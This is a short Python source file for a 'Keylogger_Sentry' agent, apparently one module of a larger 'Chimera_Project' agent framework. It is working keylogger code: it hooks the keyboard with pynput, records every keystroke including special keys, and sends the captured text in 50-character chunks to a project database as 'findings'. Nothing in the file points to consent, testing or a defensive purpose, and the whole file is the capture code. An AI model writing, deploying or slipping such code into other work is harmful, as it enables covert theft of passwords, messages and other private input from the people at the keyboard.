import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import logging
from pynput import keyboard

# GPS Line
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class Keylogger_Sentry:
    def __init__(self):
        self.agent_id = "97"
        self.name = "97_Keylogger_Sentry"
        self.db = ChimeraDB()
        self.buffer = ""

    def on_press(self, key):
        try: char = key.char
        except AttributeError: char = f"[{key.name.upper()}]"
        self.buffer += char
        if len(self.buffer) >= 50: self.flush()

    def flush(self):
        if self.buffer:
            self.db.report_finding(self.name, "Keys", {"data": self.buffer})
            self.buffer = ""

    def run(self):
        logging.basicConfig(level=logging.INFO)
        self.db.heartbeat(self.name)
        with keyboard.Listener(on_press=self.on_press) as l:
            try: l.join()
            except: self.flush(); self.db.close()

if __name__ == "__main__":
    agent = Keylogger_Sentry()
    agent.run()
